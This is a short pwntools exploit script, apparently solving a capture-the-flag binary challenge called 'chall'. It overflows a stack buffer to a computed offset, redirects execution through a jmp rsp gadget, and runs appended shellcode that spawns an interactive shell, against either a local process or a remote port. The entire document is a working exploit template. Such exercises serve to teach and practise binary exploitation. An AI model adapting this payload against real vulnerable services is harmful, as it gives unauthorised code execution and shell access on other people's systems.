#!/usr/bin/python2

from pwn import *

binary = './chall'
elf = ELF(binary)
context.binary = binary
PROCESS = [binary]
context.terminal = ['tilix', '-a', 'app-new-session', '-e']

HOST = '127.0.0.1'
PORT = 31337


def run():
    if args.R:
        return remote(HOST, PORT)
    else:
        return process(PROCESS)


r = run()
if args.D:
    gdb.attach(r, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
        b *0x4006f6
        ''')

# Addresses / Gadgets
JMP_RSP = 0x40066b

r.recvline()

OFFSET = cyclic_find(0x6161616161616170, n=8)  # cyclic(256, n=8)

payload = 'A' * OFFSET
payload += p64(JMP_RSP)
payload += asm(shellcraft.sh())
log.info(repr(payload))
r.sendline(payload)

r.interactive()
